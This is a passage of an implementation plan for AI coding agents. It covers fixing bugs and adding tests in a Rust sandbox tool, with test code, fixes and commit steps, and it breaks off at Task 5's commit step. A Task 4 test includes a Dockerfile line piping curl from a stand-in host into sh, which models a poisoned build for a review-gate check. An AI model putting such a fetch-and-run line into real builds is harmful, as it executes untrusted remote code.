# Dogfood Deep-Sprint Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix the product bugs (#122 manifest defaults, #123 unified sandbox references, #124 `egress_weakens` false-fire, NEW-1 reconcile ports.json schema) and the dogfood-harness grading gaps (H1/H2/H3/H6/H7) found by the 2026-07-09 diff/promote dogfooding run, plus graduation tests — one PR, so the swarm can then re-run from the branch and reach the previously masked deep journeys.

**Architecture:** Rust product fixes live in `izba-core` (`manifest/`, `reconcile.rs`) and `izba-cli` (new shared `sandbox_ref` resolver + clap wiring). Harness fixes live in `hack/dogfood/` (`run_journeys.py`, `oracles.py`). Spec: `docs/superpowers/specs/2026-07-10-dogfood-deep-sprint-design.md` (approved).

**Tech Stack:** Rust (workspace crates izba-core/izba-cli, serde/clap/anyhow), Python 3 stdlib (dogfood harness, pytest).

## Global Constraints

- Branch: `worktree-dogfood-deep-sprint` (this worktree, cut from origin/main `bd61471`). Never push main; conventional commits; each task commits only its own files (no `git add -A`).
- Rust gates that must stay green (run per-task where noted, all in Task 14):
  `cargo test --workspace` · `cargo clippy --workspace --all-targets -- -D warnings` · `cargo fmt --check` · `cargo build -p izba-init --target x86_64-unknown-linux-musl --release` · `cargo check --target x86_64-pc-windows-gnu -p izba-proto -p izba-core -p izba-cli` · `cargo clippy --target x86_64-pc-windows-gnu --all-targets -p izba-proto -p izba-core -p izba-cli -- -D warnings`
- Python harness tests: `python3 -m pytest hack/dogfood -q` (169 pass today; if pytest/jsonschema are missing: `python3 -m venv /tmp/dfvenv && /tmp/dfvenv/bin/pip install -q pytest jsonschema` and use `/tmp/dfvenv/bin/pytest`).
- `#[serde(deny_unknown_fields)]` stays on every manifest struct. No `DAEMON_PROTO_VERSION` bump anywhere in this plan (no wire changes).
- Unit tests never bind unix/vsock listeners (sandbox denies bind); use tempdirs + `Paths::with_root` like the existing tests.
- The `app/src-tauri` crate is OUTSIDE the workspace; Task 3 and Task 14 run its gate explicitly.

---

### Task 1: #124 — `egress_weakens` must not fire from an unenforced baseline

**Files:**
- Modify: `crates/izba-core/src/manifest/diff.rs:70-73` (function `egress_weakens`) and its `#[cfg(test)] mod tests`

**Interfaces:**
- Consumes: existing `egress_weakens(from, to) -> bool`, test helper `base()` (diff.rs:182-197, returns a `Normalized` with `egress.enforce: true`), `AllowEntry` (imported in tests).
- Produces: no signature changes; behavior: `egress_weakens` returns `false` whenever `from.enforce == false` (except nothing—there is no exception; the on→off arm only fires when `from.enforce` is true).

- [ ] **Step 1: Write the failing tests** — append to `mod tests` in `crates/izba-core/src/manifest/diff.rs`:

```rust
    /// #124 repro (dogfood 2026-07-02/09): turning enforcement ON — even while
    /// adding allow entries — is a net TIGHTENING (the unenforced `from` allowed
    /// everything), and must NOT flag `⚠ weakens egress`.
    #[test]
    fn enabling_enforce_with_allow_entries_does_not_weaken() {
        let mut from = base();
        from.egress.enforce = false;
        let mut to = base();
        to.egress.enforce = true;
        to.egress.allow = vec![AllowEntry::Host("github.com".into())];
        let d = diff(&from, &to);
        assert_eq!(d[0].field, "egress");
        assert!(
            !d[0].weakens_egress,
            "enforce off->on is a tightening even with new allow entries"
        );
    }

    /// While unenforced on BOTH sides, allow/git entries are inert — adding one
    /// changes nothing effective and must not flag weakening.
    #[test]
    fn unenforced_to_unenforced_allow_changes_do_not_weaken() {
        let mut from = base();
        from.egress.enforce = false;
        let mut to = from.clone();
        to.egress.allow = vec![AllowEntry::Host("example.com".into())];
        assert!(
            !diff(&from, &to)[0].weakens_egress,
            "allow entries are inert while unenforced"
        );
    }
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `cargo test -p izba-core manifest::diff::tests -- enabling_enforce unenforced_to`
Expected: both FAIL on the `!d[0].weakens_egress` assertions (current code compares allow-lists even when `from` is unenforced).

- [ ] **Step 3: Implement the fix** — in `egress_weakens` (diff.rs:70), directly after the existing on→off check:

```rust
    if from.enforce && !to.enforce {
        return true;
    }
    if !from.enforce {
        // `from` allowed everything (unenforced); no `to` can be weaker (#124).
        return false;
    }
```

Also update the doc comment above the function (diff.rs:67-69) to read:

```rust
/// True if turning `from` egress into `to` egress LOOSENS the firewall:
/// disabling enforce, adding a (host, port) pair, widening access
/// (read -> read-write) on any (host, port), or adding/loosening a git rule.
/// An unenforced `from` allowed everything, so nothing weakens from it (#124).
```

- [ ] **Step 4: Run the module's full test suite**

Run: `cargo test -p izba-core manifest::diff`
Expected: ALL pass (the existing `disabling_enforce_weakens_egress` still passes — its `from` is enforced).

- [ ] **Step 5: Commit**

```bash
git add crates/izba-core/src/manifest/diff.rs
git commit -m "fix(manifest): egress_weakens never fires from an unenforced baseline

Closes #124: enforce:false->true with allow entries is a tightening, not
'⚠ weakens egress'. An unenforced 'from' allowed everything, so no 'to'
can be weaker."
```

---

### Task 2: NEW-1 — reconcile reads the current ports.json schema

**Files:**
- Modify: `crates/izba-core/src/reconcile.rs:119-152` (the orphan-relay block) and its tests (`relay_dead_while_sandbox_running_is_orphan_relay` at reconcile.rs:289-317 is replaced)

**Interfaces:**
- Consumes: `crate::daemon::relays::load_rules_migrating(paths: &Paths, name: &str) -> anyhow::Result<(Vec<PortRule>, Vec<PidIdentity>)>` (relays.rs:33, already `pub`; NotFound → `(vec![], vec![])`; tries `Vec<PortRule>` first, falls back to legacy `Vec<PortRecord>` returning its relay pids; errors if neither schema matches). Test helpers `test_paths/write_state/live_identity/dead_identity` from `crate::testutil`.
- Produces: reconcile succeeds on daemon-written `Vec<PortRule>` files; `OrphanRelay` violations now mean "a legacy pre-daemon relay process is still alive".

- [ ] **Step 1: Write the failing test** — append to `mod tests` in `crates/izba-core/src/reconcile.rs`:

```rust
    /// NEW-1 (dogfood 2026-07-09): the daemon writes ports.json as the CURRENT
    /// schema (`Vec<PortRule>`, daemon/relays.rs save_rules). Reconcile used to
    /// read the legacy `Vec<PortRecord>` and errored "missing field `rule`" on
    /// every current-format file, returning a false-empty snapshot.
    #[test]
    fn current_schema_ports_json_reconciles_cleanly() {
        use crate::state::{save_json, PortRule, PORTS_FILE};
        use std::net::Ipv4Addr;

        let (_tmp, paths) = test_paths();
        std::fs::create_dir_all(paths.sandbox_dir("box")).unwrap();
        let vmm = live_identity();
        write_state(&paths, "box", vmm.clone());
        let rules = vec![PortRule {
            bind: Ipv4Addr::LOCALHOST,
            host_port: 8080,
            guest_port: 80,
        }];
        save_json(&paths.sandbox_dir("box").join(PORTS_FILE), &rules).unwrap();
        let view = vec![summary("box", "running")];
        let probes = FakeProbes {
            alive: vec![vmm],
            control: true,
        };
        let report = reconcile(&paths, Some(&view), &probes)
            .expect("current-schema ports.json must not break reconcile");
        assert!(
            report.violations.is_empty(),
            "clean current-schema state must have no violations: {:?}",
            report.violations
        );
        assert_eq!(report.sandboxes.len(), 1, "snapshot must not be empty");
    }

    /// A legacy-schema ports.json whose relay process is STILL ALIVE is an
    /// anomaly (relays are daemon threads now) — flagged as OrphanRelay.
    #[test]
    fn alive_legacy_relay_pid_is_orphan_relay() {
        use crate::state::{save_json, PortRecord, PortRule, PORTS_FILE};
        use std::net::Ipv4Addr;

        let (_tmp, paths) = test_paths();
        std::fs::create_dir_all(paths.sandbox_dir("box")).unwrap();
        let vmm = live_identity();
        write_state(&paths, "box", vmm.clone());
        let relay = PidIdentity { pid: vmm.pid + 1, starttime: 42 };
        let rec = PortRecord {
            rule: PortRule {
                bind: Ipv4Addr::LOCALHOST,
                host_port: 8080,
                guest_port: 80,
            },
            relay: relay.clone(),
        };
        save_json(&paths.sandbox_dir("box").join(PORTS_FILE), &vec![rec]).unwrap();
        let view = vec![summary("box", "running")];
        let probes = FakeProbes {
            alive: vec![vmm, relay],
            control: true,
        };
        let report = reconcile(&paths, Some(&view), &probes).unwrap();
        let v = report
            .violations
            .iter()
            .find(|v| v.kind == ViolationKind::OrphanRelay)
            .expect("alive legacy relay must be flagged");
        assert!(v.detail.contains("legacy relay"), "got: {}", v.detail);
    }

    /// A DEAD legacy relay pid is the normal migrated state — no violation.
    /// (Replaces the deleted relay_dead_while_sandbox_running_is_orphan_relay:
    /// thread relays persist no pid, so "relay dead while sandbox alive" is
    /// no longer observable from disk.)
    #[test]
    fn dead_legacy_relay_pid_is_not_flagged() {
        use crate::state::{save_json, PortRecord, PortRule, PORTS_FILE};
        use std::net::Ipv4Addr;

        let (_tmp, paths) = test_paths();
        std::fs::create_dir_all(paths.sandbox_dir("box")).unwrap();
        let vmm = live_identity();
        write_state(&paths, "box", vmm.clone());
        let rec = PortRecord {
            rule: PortRule {
                bind: Ipv4Addr::LOCALHOST,
                host_port: 8080,
                guest_port: 80,
            },
            relay: dead_identity(),
        };
        save_json(&paths.sandbox_dir("box").join(PORTS_FILE), &vec![rec]).unwrap();
        let view = vec![summary("box", "running")];
        let probes = FakeProbes {
            alive: vec![vmm],
            control: true,
        };
        let report = reconcile(&paths, Some(&view), &probes).unwrap();
        assert!(
            !report
                .violations
                .iter()
                .any(|v| v.kind == ViolationKind::OrphanRelay),
            "dead legacy relay is the normal migrated state: {:?}",
            report.violations
        );
    }
```

Also DELETE the old test `relay_dead_while_sandbox_running_is_orphan_relay` (reconcile.rs:289-317).

- [ ] **Step 2: Run to verify the first test fails**

Run: `cargo test -p izba-core reconcile::tests`
Expected: `current_schema_ports_json_reconciles_cleanly` FAILS (reconcile errors with ``missing field `rule` ``); `alive_legacy_relay_pid_is_orphan_relay` FAILS (detail says "alive while sandbox is stopped"/"dead while sandbox is alive", not "legacy relay"); `dead_legacy_relay_pid_is_not_flagged` FAILS (old code flags it).

- [ ] **Step 3: Implement** — replace the whole orphan-relay block at reconcile.rs:119-152 (from `use crate::state::{PortRecord, ...}` through the end of that `for` loop) with:

```rust
    use crate::state::{SandboxConfig, CONFIG_FILE};
    use std::collections::HashSet;

    // Orphan LEGACY relays (NEW-1): ports.json is read via the daemon's
    // schema-tolerant loader — the daemon has written `Vec<PortRule>` since the
    // thread-relay model landed, and the old strict `Vec<PortRecord>` read here
    // errored on every current-format file (false-empty snapshot). Thread
    // relays persist no pid, so relay liveness is not observable from disk;
    // the only remaining relay check is a LEGACY pre-daemon relay process that
    // survived its migration.
    for name in &disk {
        let (_rules, legacy_pids) = crate::daemon::relays::load_rules_migrating(paths, name)?;
        for pid in legacy_pids {
            if probes.pid_alive(&pid) {
                violations.push(Violation {
                    kind: ViolationKind::OrphanRelay,
                    sandbox: Some(name.clone()),
                    detail: format!(
                        "legacy relay process (pid {}) still alive; relays are daemon threads now",
                        pid.pid
                    ),
                });
            }
        }
    }
```

Note the `use` line drops `PortRecord` and `PORTS_FILE` (now only used in tests) — keep `SandboxConfig`/`CONFIG_FILE` (the orphan-volume block below still needs them).

- [ ] **Step 4: Run the file's tests + clippy**

Run: `cargo test -p izba-core reconcile && cargo clippy -p izba-core --all-targets -- -D warnings`
Expected: all reconcile tests PASS, zero warnings.

- [ ] **Step 5: Commit**

```bash
git add crates/izba-core/src/reconcile.rs
git commit -m "fix(core): izba __reconcile reads current ports.json schema via load_rules_migrating

The daemon writes Vec<PortRule> (relays.rs save_rules) but reconcile still
read the legacy Vec<PortRecord>, so every current-format file errored
'missing field \`rule\`' and produced a false-empty snapshot (also blinding
the dogfood reconcile oracle on port journeys). The pid-based orphan-relay
check is reduced to its only observable remnant: a legacy pre-daemon relay
process still alive."
```

---

### Task 3: #122 — manifest `resources`/`rootDisk` become optional with product defaults

**Files:**
- Modify: `crates/izba-core/src/manifest/schema.rs` (SandboxSpec at :36-52, Resources :54-59, RootDisk :61-65, tests)
- Modify: `crates/izba-cli/src/commands/mod.rs:44-47` (re-derive `DEFAULT_*` consts)
- Modify: `README.md` (manifest section, ~line 211-235: document the defaults)

**Interfaces:**
- Consumes: `crate::manifest::quantity::parse_mib(&str) -> Result<u32>` / `parse_gib(&str) -> Result<u64>` (used by normalize.rs:85-86; also callable from schema tests as `crate::manifest::quantity`).
- Produces: `pub const DEFAULT_CPUS: u32 = 2`, `pub const DEFAULT_MEM_MB: u32 = 4096`, `pub const DEFAULT_MEMORY: &str = "4Gi"`, `pub const DEFAULT_RW_GB: u64 = 8`, `pub const DEFAULT_ROOT_DISK_SIZE: &str = "8Gi"` in `izba_core::manifest::schema`; `impl Default for Resources` and `impl Default for RootDisk`; `SandboxSpec.resources`/`root_disk` gain `#[serde(default)]` (types unchanged — NOT `Option`). Task 14's app gate consumes this compiled crate.

- [ ] **Step 1: Write the failing tests** — append to `mod tests` in `crates/izba-core/src/manifest/schema.rs`:

```rust
    /// #122: a minimal manifest (image only) must parse, inheriting the same
    /// defaults a bare `izba run` uses — 2 cpus / 4Gi memory / 8Gi rootDisk.
    #[test]
    fn minimal_manifest_defaults_resources_and_root_disk() {
        let y = "apiVersion: izba.dev/v1alpha1\nkind: Sandbox\nspec:\n  image: ubuntu:24.04\n";
        let m = Manifest::load_str(y).expect("image-only manifest must be valid");
        assert_eq!(m.spec.resources.cpus, DEFAULT_CPUS);
        assert_eq!(m.spec.resources.memory, DEFAULT_MEMORY);
        assert_eq!(m.spec.root_disk.size, DEFAULT_ROOT_DISK_SIZE);
    }

    /// The string defaults and the numeric defaults must agree — the numeric
    /// pair is what the CLI's clap defaults reuse (single source of truth).
    #[test]
    fn default_strings_match_numeric_defaults() {
        use crate::manifest::quantity;
        assert_eq!(quantity::parse_mib(DEFAULT_MEMORY).unwrap(), DEFAULT_MEM_MB);
        assert_eq!(quantity::parse_gib(DEFAULT_ROOT_DISK_SIZE).unwrap(), DEFAULT_RW_GB);
    }
```

- [ ] **Step 2: Run to verify they fail to compile** (consts/Defaults don't exist yet)

Run: `cargo test -p izba-core manifest::schema 2>&1 | head -20`
Expected: compile error `cannot find value DEFAULT_CPUS`.

- [ ] **Step 3: Implement** — in `crates/izba-core/src/manifest/schema.rs`:

(a) After the `API_VERSION`/`KIND_SANDBOX` consts (:13-14), add:

```rust
/// Product-wide sandbox resource defaults — the single source of truth shared
/// by the manifest schema defaults (below) and the CLI's clap defaults
/// (`izba-cli commands::DEFAULT_*`). A manifest that omits `resources`/
/// `rootDisk` boots identically to a bare `izba run` (#122).
pub const DEFAULT_CPUS: u32 = 2;
pub const DEFAULT_MEM_MB: u32 = 4096;
pub const DEFAULT_MEMORY: &str = "4Gi";
pub const DEFAULT_RW_GB: u64 = 8;
pub const DEFAULT_ROOT_DISK_SIZE: &str = "8Gi";
```

(b) In `SandboxSpec` (:36-52), change the two required fields to:

```rust
    #[serde(default)]
    pub resources: Resources,
    #[serde(default, rename = "rootDisk")]
    pub root_disk: RootDisk,
```

(c) After the `Resources` struct, add:

```rust
impl Default for Resources {
    fn default() -> Self {
        Resources {
            cpus: DEFAULT_CPUS,
            memory: DEFAULT_MEMORY.to_string(),
        }
    }
}
```

(d) After the `RootDisk` struct, add:

```rust
impl Default for RootDisk {
    fn default() -> Self {
        RootDisk {
            size: DEFAULT_ROOT_DISK_SIZE.to_string(),
        }
    }
}
```

(e) In `crates/izba-cli/src/commands/mod.rs:44-47`, replace the three duplicated values (keep `DEFAULT_IMAGE` as-is, and keep the doc comment, extending it):

```rust
/// Clap default values — the single source of truth.  Both the `SandboxOpts`
/// `default_value_t` attributes in `main.rs` and the `merge_manifest_into_opts`
/// "was this field left at its default?" checks must reference these consts.
/// The resource trio re-exports the manifest schema defaults so an izba.yml
/// omitting `resources`/`rootDisk` boots identically to a bare `izba run`.
pub(crate) const DEFAULT_IMAGE: &str = "ubuntu:24.04";
pub(crate) const DEFAULT_CPUS: u32 = izba_core::manifest::schema::DEFAULT_CPUS;
pub(crate) const DEFAULT_MEM_MB: u32 = izba_core::manifest::schema::DEFAULT_MEM_MB;
pub(crate) const DEFAULT_RW_GB: u64 = izba_core::manifest::schema::DEFAULT_RW_GB;
```

(f) In `README.md`'s "Project manifest (`izba.yml`)" section (the example around line 228-232 shows `resources:`/`rootDisk:`), add one sentence right after the example block:

```markdown
`spec.resources` and `spec.rootDisk` are optional — when omitted they default
to **2 cpus / 4Gi memory / 8Gi root disk**, the same defaults as a bare
`izba run`, so a minimal manifest is just `apiVersion` + `kind` + `spec.image`.
```

- [ ] **Step 4: Run the crate tests + the app gate** (the app embeds these types via `compute_diff`/`export`)

Run: `cargo test -p izba-core manifest && cargo test -p izba-cli`
Expected: PASS (existing `rejects_neither_image_nor_build` etc. unaffected — image-xor-build validation is separate).
Run: `cd app && npm ci && npm run build && (cd src-tauri && cargo fmt --check && cargo clippy --all-targets -- -D warnings && cargo test)` — from the worktree root; expected PASS (no type-shape change, this is the mandated CLAUDE.md gate).

- [ ] **Step 5: Commit**

```bash
git add crates/izba-core/src/manifest/schema.rs crates/izba-cli/src/commands/mod.rs README.md
git commit -m "feat(manifest): resources/rootDisk optional with product defaults (2 cpus / 4Gi / 8Gi)

Closes #122: a minimal izba.yml (image only) now parses and boots identically
to a bare 'izba run'. Defaults are single-sourced in izba_core::manifest::schema
and reused by the CLI clap defaults. deny_unknown_fields unchanged."
```

---

### Task 4: Graduation tests — Dockerfile-change TOCTOU on the review token

**Files:**
- Modify: `crates/izba-cli/src/commands/promote.rs` (tests module only, after `gate_passes_on_match` at :326-329)

**Interfaces:**
- Consumes: `izba_core::manifest::store::review_token(manifest_yaml: &str, dockerfile: Option<&str>) -> String` (store.rs:19); `gate(review: Option<&str>, current_token: &str, force: bool) -> GateOutcome` (promote.rs:32); `store` is already imported at promote.rs:11.
- Produces: tests only.

- [ ] **Step 1: Write the tests** (they should pass immediately — they graduate a swarm-unreachable behavior into deterministic coverage; if either FAILS, that is a product bug — stop and report):

```rust
    /// Graduation (dogfood 2026-07-09, spec §7/§9): the review token binds the
    /// review to BOTH files. Editing the Dockerfile after `izba diff` — with the
    /// manifest untouched — must stale the gate (the TOCTOU the swarm never
    /// reached: a poisoned build slipping under a stale review).
    #[test]
    fn dockerfile_change_invalidates_review_token() {
        let manifest = "apiVersion: izba.dev/v1alpha1\nkind: Sandbox\nspec:\n  image: x\n";
        let reviewed = store::review_token(manifest, Some("FROM alpine:3.20\n"));
        let current = store::review_token(
            manifest,
            Some("FROM alpine:3.20\nRUN curl evil.example | sh\n"),
        );
        assert_ne!(reviewed, current, "Dockerfile bytes must move the token");
        assert_eq!(gate(Some(&reviewed), &current, false), GateOutcome::Stale);
        assert_eq!(gate(Some(&reviewed), &current, true), GateOutcome::ForcedStale);
    }

    /// Graduation: editing izba.yml after `izba diff` equally stales the gate
    /// (complements gate_detects_stale_review with the real token function).
    #[test]
    fn manifest_edit_after_diff_invalidates_review_token() {
        let reviewed = store::review_token("spec: a", None);
        let current = store::review_token("spec: a  # edited after review", None);
        assert_ne!(reviewed, current);
        assert_eq!(gate(Some(&reviewed), &current, false), GateOutcome::Stale);
    }
```

- [ ] **Step 2: Run them**

Run: `cargo test -p izba-cli promote::tests`
Expected: PASS (these pin existing correct behavior).

- [ ] **Step 3: Commit**

```bash
git add crates/izba-cli/src/commands/promote.rs
git commit -m "test(cli): graduate the Dockerfile/manifest TOCTOU review-gate legs to unit tests

The 2026-07-09 dogfood run could never drive the swarm to these refusals
(#122 masked them); per the graduation rule they land as deterministic tests
over store::review_token + promote::gate."
```

---

### Task 5: #123 — shared `sandbox_ref` resolver (NAME-or-DIR, one rule set)

**Files:**
- Create: `crates/izba-cli/src/commands/sandbox_ref.rs`
- Modify: `crates/izba-cli/src/commands/mod.rs` (add `pub mod sandbox_ref;` to the module list at :1-23, and make `load_manifest_yaml` at :34 `pub(crate)`)

**Interfaces:**
- Consumes: `super::load_manifest_yaml(dir) -> Result<Manifest>` (mod.rs:34, becomes `pub(crate)`), `super::workspace_default_name(dir) -> Result<String>` (mod.rs:58), `izba_core::state::{load_json, SandboxConfig, CONFIG_FILE}` (`SandboxConfig.workspace: PathBuf`, state.rs:26), `izba_core::sandbox::validate_name`.
- Produces (used by Tasks 6-7):
  - `pub(crate) struct SandboxRef { pub name: String, pub workspace: Option<PathBuf> }`
  - `pub(crate) fn resolve(paths: &Paths, arg: Option<&str>) -> anyhow::Result<SandboxRef>`
  - `pub(crate) fn workspace_sandbox_name(dir: &Path) -> anyhow::Result<String>`

- [ ] **Step 1: Create the module with failing tests** — write `crates/izba-cli/src/commands/sandbox_ref.rs`:

```rust
//! Unified sandbox references (#123): every wired command accepts a sandbox
//! NAME or a WORKSPACE directory through one deterministic rule set —
//! path-looking arguments are workspaces, bare words are names first, and no
//! argument means "the workspace I'm standing in". See README
//! "Referring to sandboxes".

use std::path::{Path, PathBuf};

use anyhow::{bail, Context};
use izba_core::paths::Paths;
use izba_core::state::{load_json, SandboxConfig, CONFIG_FILE};

/// A resolved reference: the sandbox name plus, when known, its workspace dir.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct SandboxRef {
    pub name: String,
    /// `Some` for workspace-form references and for name-form references whose
    /// config.json records a workspace; `None` only if that record is missing.
    pub workspace: Option<PathBuf>,
}

/// Path syntax is decided SYNTACTICALLY, never from disk state: `.`/`..`, any
/// separator, or a `./`/`../` prefix. Sandbox names can never contain a
/// separator (`[a-z0-9][a-z0-9_.-]*`), so this is unambiguous.
fn is_path_syntax(arg: &str) -> bool {
    arg == "." || arg == ".." || arg.contains('/') || arg.contains('\\')
}

fn sandbox_exists(paths: &Paths, name: &str) -> bool {
    paths.sandbox_dir(name).join(CONFIG_FILE).is_file()
}

/// The workspace dir recorded at create time (config.json `workspace`).
fn recorded_workspace(paths: &Paths, name: &str) -> anyhow::Result<Option<PathBuf>> {
    let cfg: Option<SandboxConfig> = load_json(&paths.sandbox_dir(name).join(CONFIG_FILE))?;
    Ok(cfg.map(|c| c.workspace))
}

/// The sandbox a workspace dir refers to: izba.yml `metadata.name` when the
/// manifest exists (malformed YAML propagates — never silently the wrong
/// sandbox), else the sanitized dir basename.
pub(crate) fn workspace_sandbox_name(dir: &Path) -> anyhow::Result<String> {
    if dir.join("izba.yml").is_file() {
        let m = super::load_manifest_yaml(dir)?;
        if let Some(n) = m.metadata.name {
            izba_core::sandbox::validate_name(&n)
                .with_context(|| format!("izba.yml metadata.name {n:?}"))?;
            return Ok(n);
        }
    }
    super::workspace_default_name(dir)
}

fn workspace_ref(dir: &Path) -> anyhow::Result<SandboxRef> {
    let name = workspace_sandbox_name(dir)?;
    Ok(SandboxRef {
        name,
        workspace: Some(dir.to_path_buf()),
    })
}

/// Resolve an optional positional argument into a [`SandboxRef`]:
///
/// 1. omitted     → the current directory's workspace;
/// 2. path syntax → that workspace directory (deterministic, never guesses);
/// 3. bare word   → an existing sandbox of that name; else, if `./word/izba.yml`
///    exists, that workspace (with a printed note); else a hint error naming
///    both interpretations;
/// 4. safety rail → a bare word matching an existing sandbox AND a
///    `./word/izba.yml` that resolves to a DIFFERENT sandbox is a hard error
///    (no silent wrong-target `rm`).
pub(crate) fn resolve(paths: &Paths, arg: Option<&str>) -> anyhow::Result<SandboxRef> {
    let arg = match arg {
        None => return workspace_ref(Path::new(".")),
        Some(a) => a,
    };
    if is_path_syntax(arg) {
        return workspace_ref(Path::new(arg));
    }
    let as_dir = Path::new(arg);
    let dir_has_manifest = as_dir.join("izba.yml").is_file();
    if sandbox_exists(paths, arg) {
        if dir_has_manifest {
            let dir_name = workspace_sandbox_name(as_dir)?;
            if dir_name != arg {
                bail!(
                    "'{arg}' is both a sandbox name and a directory whose izba.yml \
                     resolves to sandbox '{dir_name}' — pass './{arg}' for the \
                     directory, or the exact sandbox name"
                );
            }
        }
        return Ok(SandboxRef {
            name: arg.to_string(),
            workspace: recorded_workspace(paths, arg)?,
        });
    }
    if dir_has_manifest {
        eprintln!("note: no sandbox named '{arg}'; using workspace directory ./{arg}");
        return workspace_ref(as_dir);
    }
    bail!(
        "no sandbox named '{arg}' and no ./{arg}/izba.yml — pass an existing \
         sandbox name or a workspace directory (e.g. './{arg}')"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    const MANIFEST: &str = concat!(
        "apiVersion: izba.dev/v1alpha1\n",
        "kind: Sandbox\n",
        "metadata: { name: fromyaml }\n",
        "spec:\n",
        "  image: ubuntu:24.04\n",
    );

    /// A tempdir-rooted Paths + one registered sandbox with a recorded workspace.
    fn fixture(name: &str) -> (tempfile::TempDir, Paths, PathBuf) {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let ws = tmp.path().join("recorded-ws");
        std::fs::create_dir_all(&ws).unwrap();
        std::fs::create_dir_all(paths.sandbox_dir(name)).unwrap();
        let cfg = format!(
            r#"{{"image_digest":"d","image_ref":"ubuntu:24.04","cpus":2,
                "mem_mb":4096,"workspace":{}}}"#,
            serde_json::to_string(&ws).unwrap()
        );
        std::fs::write(paths.sandbox_dir(name).join(CONFIG_FILE), cfg).unwrap();
        (tmp, paths, ws)
    }

    #[test]
    fn bare_word_resolves_existing_sandbox_with_recorded_workspace() {
        let (_tmp, paths, ws) = fixture("myapp");
        let r = resolve(&paths, Some("myapp")).unwrap();
        assert_eq!(r.name, "myapp");
        assert_eq!(r.workspace.as_deref(), Some(ws.as_path()));
    }

    #[test]
    fn path_syntax_is_always_a_workspace() {
        let (_tmp, paths, _ws) = fixture("myapp");
        // Even though a sandbox "myapp" exists, "./myapp" is path syntax.
        let tmp2 = tempfile::tempdir().unwrap();
        let dir = tmp2.path().join("myapp");
        std::fs::create_dir_all(&dir).unwrap();
        let dir_s = dir.to_string_lossy().into_owned();
        let r = resolve(&paths, Some(&dir_s)).unwrap();
        assert_eq!(r.name, "myapp", "basename-derived name");
        assert_eq!(r.workspace.as_deref(), Some(dir.as_path()));
    }

    #[test]
    fn omitted_arg_means_current_workspace() {
        let (_tmp, paths, _ws) = fixture("other");
        let r = resolve(&paths, None).unwrap();
        // cwd's basename, sanitized — matches workspace_default_name(".").
        let expected = super::super::workspace_default_name(Path::new(".")).unwrap();
        assert_eq!(r.name, expected);
        assert_eq!(r.workspace.as_deref(), Some(Path::new(".")));
    }

    #[test]
    fn bare_word_falls_back_to_local_dir_with_manifest() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        // Run from tmp as cwd is not possible in a unit test; use a relative
        // path via current_dir juggling — instead exercise the fallback through
        // an absolute-path-free bare word by chdir-ing.
        let proj = tmp.path().join("proj");
        std::fs::create_dir_all(&proj).unwrap();
        std::fs::write(proj.join("izba.yml"), MANIFEST).unwrap();
        let prev = std::env::current_dir().unwrap();
        std::env::set_current_dir(tmp.path()).unwrap();
        let r = resolve(&paths, Some("proj"));
        std::env::set_current_dir(prev).unwrap();
        let r = r.unwrap();
        assert_eq!(r.name, "fromyaml", "manifest metadata.name wins for the dir");
        assert_eq!(r.workspace.as_deref(), Some(Path::new("proj")));
    }

    #[test]
    fn bare_word_matching_nothing_is_a_hint_error() {
        let tmp = tempfile::tempdir().unwrap();
        let paths = Paths::with_root(tmp.path().join("izba"));
        let err = resolve(&paths, Some("ghost")).unwrap_err().to_string();
        assert!(err.contains("no sandbox named 'ghost'"), "{err}");
        assert!(err.contains("./ghost"), "hint must show the dir form: {err}");
    }

    #[test]
    fn ambiguous_bare_word_is_a_hard_error() {
        let (tmp, paths, _ws) = fixture("proj");
        // ./proj/izba.yml resolves to a DIFFERENT sandbox name ("fromyaml").
        let proj = tmp.path().join("proj");
        std::fs::create_dir_all(&proj).unwrap();
        std::fs::write(proj.join("izba.yml"), MANIFEST).unwrap();
        let prev = std::env::current_dir().unwrap();
        std::env::set_current_dir(tmp.path()).unwrap();
        let res = resolve(&paths, Some("proj"));
        std::env::set_current_dir(prev).unwrap();
        let err = res.unwrap_err().to_string();
        assert!(err.contains("both a sandbox name and a directory"), "{err}");
        assert!(err.contains("'fromyaml'"), "{err}");
    }

    #[test]
    fn agreeing_bare_word_resolves_as_the_sandbox() {
        // Sandbox "proj" exists AND ./proj/izba.yml names the SAME sandbox — fine.
        let (tmp, paths, ws) = fixture("proj");
        let proj = tmp.path().join("proj");
        std::fs::create_dir_all(&proj).unwrap();
        std::fs::write(
            proj.join("izba.yml"),
            MANIFEST.replace("fromyaml", "proj"),
        )
        .unwrap();
        let prev = std::env::current_dir().unwrap();
        std::env::set_current_dir(tmp.path()).unwrap();
        let r = resolve(&paths, Some("proj"));
        std::env::set_current_dir(prev).unwrap();
        let r = r.unwrap();
        assert_eq!(r.name, "proj");
        assert_eq!(r.workspace.as_deref(), Some(ws.as_path()));
    }
}
```

CAUTION for the two `set_current_dir` tests: `cargo test` runs tests concurrently in one process — chdir is process-global. Guard them with a shared mutex, exactly like this (add at the top of `mod tests`):

```rust
    use std::sync::Mutex;
    static CWD_LOCK: Mutex<()> = Mutex::new(());
```

and take `let _g = CWD_LOCK.lock().unwrap();` as the FIRST line of `bare_word_falls_back_to_local_dir_with_manifest`, `ambiguous_bare_word_is_a_hard_error`, `agreeing_bare_word_resolves_as_the_sandbox`, AND `omitted_arg_means_current_workspace` (it reads the cwd). If `izba-cli` has no `serde_json` dev-dependency, replace the `serde_json::to_string(&ws)` interpolation with a manually escaped path (the tempdir path contains no quotes on Linux): `format!("\"{}\"", ws.display())` — check `Cargo.toml` first; `serde_json` is preferred if present.

- [ ] **Step 2: Wire the module + run the tests**

In `crates/izba-cli/src/commands/mod.rs` add `pub mod sandbox_ref;` (alphabetical: between `run` and `ssh` at :16-17) and change `fn load_manifest_yaml` (:34) to `pub(crate) fn load_manifest_yaml`.

Run: `cargo test -p izba-cli sandbox_ref`
Expected: all PASS.

- [ ] **Step 3: Clippy + fmt**

Run: `cargo clippy -p izba-cli --all-targets -- -D warnings && cargo fmt`
Expected: clean.

- [ ] **Step 4: Commit**

```bash
